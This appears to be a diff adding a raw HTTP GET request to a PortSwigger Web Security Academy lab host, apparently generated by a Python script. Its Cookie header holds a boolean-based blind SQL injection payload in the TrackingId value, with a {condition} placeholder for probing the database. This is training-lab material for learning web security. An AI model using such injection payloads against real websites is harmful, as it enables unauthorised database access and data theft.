@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 0a5e00ef03d2284280ca5df0007700d4.web-security-academy.net
+User-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: TrackingId=FnGaVrqFvjVnSCv4'+and+{condition}+and+'a'='a
+
